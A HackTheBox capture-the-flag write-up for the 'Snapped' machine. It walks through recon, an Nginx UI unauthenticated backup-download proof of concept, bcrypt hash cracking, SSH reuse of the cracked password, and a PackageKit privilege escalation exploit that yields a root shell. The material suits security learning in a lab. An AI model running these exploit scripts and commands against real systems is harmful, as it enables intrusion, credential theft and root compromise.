---
layout: page
title: Snapped
description: Triggered and pilfered Nginx UI backups.
img: 
importance: 2
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/logo.png" title="HTB Snapped" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Snapped">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Ready to try a hard box?  Let's see if can get something to snap!  

To get get started, as per the usual, let's started with a good ol' nmap.

{% capture nmap %}
└──╼ [★]$ sudo nmap -sC -sV -A -O -oN nmap 10.129.7.5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-08 02:08 EDT
Nmap scan report for 10.129.7.5
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/8%OT=22%CT=1%CU=39532%PV=Y%DS=2%DC=T%G=Y%TM=6A9FA682
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=105%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%T
OS:S=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10
OS:E%TI=Z%CI=Z%TS=A)OPS(O1=M552ST11NW9%O2=M552ST11NW9%O3=M552NNT11NW9%O4=M5
OS:52ST11NW9%O5=M552ST11NW9%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88
OS:%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW9%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   201.52 ms 10.10.14.1
2   202.36 ms 10.129.7.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.97 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Since the nmap mentions redirect, update the /etc/hosts with `snapped.htb`.

{% capture etchosts %}
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1
10.129.7.5  snapped.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-p3vp5cdyts htb-p3vp5cdyts.htb-cloud.com
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etchosts %}

<br />
Give the server on port 80 a `curl -I` to try and fingerprint any technologies from the headers.

{% capture curli %}
└──╼ [★]$ curl -I http://snapped.htb
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 07 Sep 2026 06:18:28 GMT
Content-Type: text/html
Content-Length: 20199
Last-Modified: Thu, 19 Mar 2026 15:11:44 GMT
Connection: keep-alive
ETag: "69bc1230-4ee7"
Accept-Ranges: bytes
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli %}

<br />
Check the landing page to see what it is.  Give it a little peek.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/landingpage.png" title="Langing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
And of cource, check the source code looking for something juicy.  I also checked the robots.txt but didn't take a screen-print.

{% capture sourcecode %}
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapped — Infrastructure. Orchestration. Control.</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <!-- Grain -->
  <div class="grain" aria-hidden="true"></div>

<snip>

  })();
  </script>
</body>
</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://snapped.htb' content=sourcecode %}

<br />
Let's try to `ffuf` to try and brute-force subdomains.

{% capture ffufsubdomains %}
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://snapped.htb -H "Host: FUZZ.snapped.htb" -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 204ms]
:: Progress: [114442/114442] :: Job [1/1] :: 205 req/sec :: Duration: [0:09:45] :: Errors: 0 ::
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffufsubdomains %}

<br />
Add this to the /etc/hosts file too so it resolves.

{% capture etchoststwo %}
└──╼ [★]$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	pwnbox7.1
10.129.7.5  snapped.htb admin.snapped.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-p3vp5cdyts htb-p3vp5cdyts.htb-cloud.com
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=etchoststwo %}

<br />
Just like we did for the main site, let's give `curl -I` another whirl.

{% capture curliadmin %}
└──╼ [★]$ curl -I http://admin.snapped.htb
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Mon, 07 Sep 2026 06:28:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1407
Connection: keep-alive
Accept-Ranges: bytes
Request-Id: 1156b111-32d9-42a1-a974-bd99efcd6f6a
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curliadmin %}

<br />
And check the landing page to see what is running.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/adminlandingpage.png" title="Admin Langing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
As per the usual, search the source code.

{% capture sourcecodeadmin %}
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link href="./favicon.ico" rel="icon">
  <link href="./favicon-32x32.png" rel="icon" type="image/png" sizes="32x32">
  <meta content="width=device-width,initial-scale=1.0,user-scalable=0" name="viewport">

  <!-- PWA Manifest -->
  <link rel="manifest" href="./manifest.json">

  <!-- PWA Meta Tags -->
  <meta name="theme-color" content="#ffffff">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="apple-mobile-web-app-title" content="Nginx UI">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-config" content="./browserconfig.xml">

  <!-- Apple Touch Icons -->
  <link rel="apple-touch-icon" sizes="192x192" href="./pwa-192x192.png">
  <link rel="apple-touch-icon" sizes="512x512" href="./pwa-512x512.png">

  <style>
    body {
      height: auto !important;
      min-height: 100%;
    }

    body.dark {
      background-color: #141414;
      color: #fff;
    }

    #app {
      height: 100vh;
    }
  </style>
  <title>Nginx UI</title>
  <script type="module" crossorigin src="./assets/index-DoHxQupa.js"></script>
  <link rel="stylesheet" crossorigin href="./assets/index-Cjd4fVAL.css">
</head>

<body>
  <div id="app"></div>
</body>

</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://admin.snapped.htb' content=sourcecodeadmin %}

<br />
Check the documentation looking for the default creds.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/docos.png" title="Documentation" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://nginxui.com/guide/getting-started">https://nginxui.com/guide/getting-started</a>

<br />
Test the creds to see if they work.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/testadmin.png" title="Test Admin Credentials" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test a fake name to see if you can enumerate the usernames.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/testfakename.png" title="Test Fake Name" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the Nginx for any outstanding vulneribilities.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/githubvulnerability.png" title="Check Vulnerability" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/advisories/GHSA-g9w5-qffc-6762"></a>

<br />
Copy the exploit poc out from the advisory.

{% capture exploit %}
#!/usr/bin/env python3

"""
POC: Unauthenticated Backup Download + Key Disclosure via X-Backup-Security

Usage:
  python poc.py --target http://127.0.0.1:9000 --out backup.bin --decrypt
"""

import argparse
import base64
import os
import sys
import urllib.parse
import urllib.request
import zipfile
from io import BytesIO

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
except ImportError:
    print("Error: pycryptodome required for decryption")
    print("Install with: pip install pycryptodome")
    sys.exit(1)

<snip>

def main():
    ap = argparse.ArgumentParser(
        description="Nginx UI - Unauthenticated backup download with key disclosure"
    )
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
    ap.add_argument("--out", default="backup.bin", help="Where to save the encrypted backup")
    ap.add_argument("--decrypt", action="store_true", help="Decrypt the backup after download")
    ap.add_argument("--extract-dir", default="backup_extracted", help="Directory to extract decrypted files")

    args = ap.parse_args()

    url = urllib.parse.urljoin(args.target.rstrip("/") + "/", "api/backup")

    # Unauthenticated request to the backup endpoint
    req = urllib.request.Request(url, method="GET")

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            hdr = resp.headers.get("X-Backup-Security", "")
            key, iv = _parse_keys(hdr)
            data = resp.read()
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    with open(args.out, "wb") as f:
        f.write(data)

<snip>

if __name__ == "__main__":
    main()
{% endcapture %}
{% include terminal.html language='python' title='exploit.py' content=exploit %}

<br />
Run the exploit to snag the backup.

{% capture runexploit %}
└──╼ [★]$ python exploit.py --target http://admin.snapped.htb --decrypt

X-Backup-Security: 2JOahEwOpK9vGkb0Ga/n3GGFSEB15MW4FgnkSse5p6A=:Y3D/VlD7FrBQcuNyYf+daA==
Parsed AES-256 key: 2JOahEwOpK9vGkb0Ga/n3GGFSEB15MW4FgnkSse5p6A=
Parsed AES IV    : Y3D/VlD7FrBQcuNyYf+daA==

[*] Key length: 32 bytes (AES-256 ✓)
[*] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7737 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: a1c6bd5666d19151e483c63a5c0da79ca109d2702d22b3b1483fd835f8ac66fb
nginx_hash: 32f66d7d5ace21d51962ea017578af13483c8e921efd8bd0fa4dbe69bccff1d3
timestamp: 20260907-025549
version: 2.3.2
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runexploit %}

<br />
Now, this is the point where I wasted about 1 to 2 hours trying to decode and crack all of the hashes and encryptions key from the summary output.  After john the ripper failed to crack the summary data, I actually read the security advisory instead of just grabbing the script and figured out the next steps.

{% capture crackkeys %}
└──╼ [★]$ john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2026-09-08 02:59) 0g/s 11756Kp/s 11756Kc/s 23513KC/s -sevim-..*7¡Vamos!
Session completed. 
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
Warning: detected hash type "cryptoSafe", but the string is also recognized as "gost"
Use the "--format=gost" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "HAVAL-256-3"
Use the "--format=HAVAL-256-3" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Panama"
Use the "--format=Panama" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "po"
Use the "--format=po" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-Keccak-256"
Use the "--format=Raw-Keccak-256" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-SHA256"
Use the "--format=Raw-SHA256" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "skein-256"
Use the "--format=skein-256" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Snefru-256"
Use the "--format=Snefru-256" option to force loading these as that type instead
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Stribog-256"
Use the "--format=Stribog-256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (cryptoSafe [AES-256-CBC])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 DONE (2026-09-08 02:59) 0g/s 4181Kp/s 8362Kc/s 8362KC/s 0877066446..*7¡Vamos!
Session completed.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=crackkeys %}

<br />
If you `ls` your working directory, you will see the extracted backup.  Poke around and find the `database.db` file.

{% capture finddatabase %}
└──╼ [★]$ ls -la
total 261
drwxrwxr-x 2 biscottidiskette biscottidiskette   1024 Sep  8 02:51 .
drwxrwxr-x 4 biscottidiskette biscottidiskette   1024 Sep  8 02:51 ..
-rw-rw-r-- 1 biscottidiskette biscottidiskette   2295 Sep  8 04:20 app.ini
-rw-rw-r-- 1 biscottidiskette biscottidiskette 262144 Sep  8 04:20 database.db 
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=finddatabase %}

<br />
Check the DB Browser and Browse the users table.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/dbbrowser.png" title="DB Browser" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a hashes file with the password hashes so we can feed them to john.

{% capture passwordhashes %}
└──╼ [★]$ echo 'admin:$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm' > hashes.txt
└──╼ [★]$ echo 'jonathan:$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq' >> hashes.txt
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=passwordhashes %}

<br />
Pass the hashes file to john for the crack.  Sweet!

{% capture passtojohn %}
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
linkinpark       (jonathan)     
1g 0:00:00:48 0.05% (ETA: 2026-09-09 07:31) 0.02062g/s 177.4p/s 187.8c/s 187.8C/s sheba1..brigitte
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=passtojohn %}

<br />
Authenticate into the website with the credentials we just discovered.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/nginxdashboard.png" title="Nginx UI Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
After about an hour of enumerating the dashboard, including about 15 minutes on the terminal, pivot.  Check for password re-use and attempt to ssh into the machine.

{% capture ssh %}
└──╼ [★]$ ssh jonathan@10.129.7.5
jonathan@10.129.7.5's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ssh %}

<br />
Check the sudo -l to see if we have any permissions.

{% capture sudol %}
jonathan@snapped:~$ id
uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
jonathan@snapped:~$ sudo -l
[sudo] password for jonathan: 
Sorry, user jonathan may not run sudo on snapped.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sudol %}

<br />
Check the bash_history to see if there is anything spicy.

{% capture bashhistory %}
jonathan@snapped:~$ cat .bash_history
jonathan@snapped:~$ 
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=bashhistory %}

<br />
Nick the user.txt file.

{% capture userflag %}
jonathan@snapped:~$ cat user.txt
<redacted>
jonathan@snapped:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:3a:ef brd ff:ff:ff:ff:ff:ff
    altname enp34s2
    altname ens34
    inet 10.129.7.5/16 brd 10.129.255.255 scope global dynamic noprefixroute eth0
       valid_lft 2837sec preferred_lft 2387sec
    inet6 dead:beef::65a:410a:61f3:e7ed/64 scope global dynamic mngtmpaddr noprefixroute 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::5eb3:7b7d:ac54:9838/64 scope link 
       valid_lft forever preferred_lft forever 
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Download the peas.

{% capture downloadlinpeas %}
└──╼ [★]$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 1133k  100 1133k    0     0  18.8M      0 --:--:-- --:--:-- --:--:-- 18.8M
└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadlinpeas %}

<br />
Transfer linpeas to the victim machine.

{% capture transferlinpeas %}
jonathan@snapped:/dev/shm$ wget 10.10.15.20:8000/linpeas.sh
--2026-09-08 05:25:44--  http://10.10.15.20:8000/linpeas.sh
Connecting to 10.10.15.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1160598 (1.1M) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                      100%[=====================================================================================================>]   1.11M   702KB/s    in 1.6s    

2026-09-08 05:25:46 (702 KB/s) - ‘linpeas.sh’ saved [1160598/1160598]

jonathan@snapped:/dev/shm$ chmod +x linpeas.sh
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferlinpeas %}

<br />
Run the peas and review the output.  Notice the CVE-2026-41651.

{% capture runthepeas %}
jonathan@snapped:/dev/shm$ ./linpeas.sh 



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
PackageKit version detected: 1.2.8-2ubuntu1.4
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8-2ubuntu1.4 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5

<snip>

{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runthepeas %}

<br />
Research CVE-2026-41651 from the linpeas results.  Find an exploit on the GitHub.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/snapped/privescexploit.png" title="Priv Esc Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Clone the repository.  Change into the folder.

{% capture clone %}
└──╼ [★]$ git clone https://github.com/Vozec/CVE-2026-41651.git
Cloning into 'CVE-2026-41651'...
remote: Enumerating objects: 57, done.
remote: Counting objects: 100% (57/57), done.
remote: Compressing objects: 100% (41/41), done.
remote: Total 57 (delta 24), reused 47 (delta 14), pack-reused 0 (from 0)
Receiving objects: 100% (57/57), 144.89 KiB | 3.71 MiB/s, done.
Resolving deltas: 100% (24/24), done.
└──╼ [★]$ cd CVE-2026-41651/
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=clone %}

<br />
Transfer to the victim machine.

{% capture transferexploit %}
jonathan@snapped:/dev/shm$ wget 10.10.15.20:8000/cve-2026-41651
--2026-09-08 05:59:01--  http://10.10.15.20:8000/cve-2026-41651
Connecting to 10.10.15.20:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27544 (27K) [application/octet-stream]
Saving to: ‘cve-2026-41651’

cve-2026-41651                                  100%[=====================================================================================================>]  26.90K  55.5KB/s    in 0.5s    

2026-09-08 05:59:02 (55.5 KB/s) - ‘cve-2026-41651’ saved [27544/27544]

jonathan@snapped:/dev/shm$ chmod +x cve-2026-41651
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferexploit %}

<br />
Run the exploit.

{% capture runexploit %}
jonathan@snapped:/dev/shm$ ./cve-2026-41651 
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-94262.deb
[+] payload : /tmp/.pk-payload-94262.deb
[*] Transaction : /2_cdcbcdcc
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 71 ms
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet
[*] t+3s: payload=exists dpkg_lock=free suid=not yet

[+] SUCCESS — SUID bash at t+2200ms
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
.suid_bash: no job control in this shell
.suid_bash-5.2# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runexploit %}

<br />
Grab the root flag.

{% capture rootflag %}
.suid_bash-5.2# cat /root/root.txt
<redacted>
.suid_bash-5.2# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:3a:ef brd ff:ff:ff:ff:ff:ff
    altname enp34s2
    altname ens34
